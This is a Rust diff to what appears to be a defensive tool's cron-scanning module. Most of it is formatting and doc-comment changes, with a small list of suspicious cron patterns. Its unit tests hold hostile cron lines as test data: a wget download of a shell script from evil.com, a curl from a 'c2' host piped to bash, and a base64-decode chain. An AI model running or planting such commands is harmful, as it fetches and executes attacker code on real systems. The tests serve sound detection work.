@@ -10,21 +10,30 @@ use std::io::Write;
 use std::path::PathBuf;
 use std::process::{Command, Stdio};
 
+use crate::core::scan::{references_untrusted_dir, suspicious_matches};
 use crate::core::{
     DefenderContext, DefenderError, Finding, Result, Severity, Verdict, collect_users,
     require_root, try_clear_immutable,
 };
-use crate::core::scan::{suspicious_matches, references_untrusted_dir};
 
 /// Cron-specific patterns not covered by `core::scan::suspicious_matches`.
 struct CronPattern {
+    /// Short label for this cron pattern.
     name: &'static str,
+    /// Lowercased substring that identifies the pattern.
     needle: &'static str,
 }
 
+/// Cron-specific patterns beyond the shared behavioral scan.
 const CRON_EXTRA_PATTERNS: &[CronPattern] = &[
-    CronPattern { name: "nohup background", needle: "nohup" },
-    CronPattern { name: "chmod +x", needle: "chmod +x" },
+    CronPattern {
+        name: "nohup background",
+        needle: "nohup",
+    },
+    CronPattern {
+        name: "chmod +x",
+        needle: "chmod +x",
+    },
 ];
 
 /// Walk every user's crontab.  Suspicious entries are logged as evidence and
@@ -248,14 +257,22 @@ mod tests {
     #[test]
     fn wget_download_is_flagged() {
         let patterns = matched_patterns("* * * * * wget http://evil.com/shell.sh -O /tmp/s");
-        assert!(patterns.iter().any(|p| p.contains("fetches remote content")));
+        assert!(
+            patterns
+                .iter()
+                .any(|p| p.contains("fetches remote content"))
+        );
         assert!(patterns.iter().any(|p| p.contains("untrusted directory")));
     }
 
     #[test]
     fn pipe_to_bash_is_flagged() {
         let patterns = matched_patterns("*/5 * * * * curl http://c2/payload | bash");
-        assert!(patterns.iter().any(|p| p.contains("fetches remote content")));
+        assert!(
+            patterns
+                .iter()
+                .any(|p| p.contains("fetches remote content"))
+        );
         assert!(patterns.iter().any(|p| p.contains("shell")));
     }
 
@@ -270,10 +287,7 @@ mod tests {
     fn base64_is_flagged_once() {
         // Two base64 patterns in core/scan.rs share a reason; should deduplicate.
         let patterns = matched_patterns("* * * * * echo dGVzdA== | base64 -d | base64 --decode");
-        let count = patterns
-            .iter()
-            .filter(|p| p.contains("base64"))
-            .count();
+        let count = patterns.iter().filter(|p| p.contains("base64")).count();
         assert_eq!(count, 1);
     }
 }
